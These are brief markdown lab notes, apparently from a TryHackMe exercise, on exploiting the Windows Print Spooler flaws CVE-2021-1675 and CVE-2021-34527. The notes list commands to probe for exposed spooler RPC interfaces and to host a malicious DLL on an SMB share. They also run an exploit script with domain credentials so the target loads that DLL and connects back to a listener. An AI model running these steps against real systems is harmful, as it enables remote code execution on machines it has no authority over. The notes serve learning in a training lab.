## Window Print Spooler Vulnerability
- managing the print jobs, receiving files to be printed, queueing them, and scheduling
- able to Start/Stop/Pause/Resume the Print Spooler Service in Service

```
rpcdump.py @10.10.56.87 | egrep 'MS-RPRN|MS-PAR'
```

#### the CVE-2021-1675 and CVE-2021-34527
- CVE-2021-1675 (need local access)
- Can remotely inject DLL (CVE-2021-34527)

- https://github.com/tryhackme/CVE-2021-1675.git

- Host SMB Share with malicious .dll file inside

```
smbserver.py share "/dir/to/share" -smb2support
```

- Run
```
./exploitCVE.py domain/domainuser:password@ip "/share/malicious.dll"
```

- Listen on .dll payload lhost lport

- Folder on victim to check
```
"C:\\Windows\\System32\\spool\\drivers\\x64\\3"
```
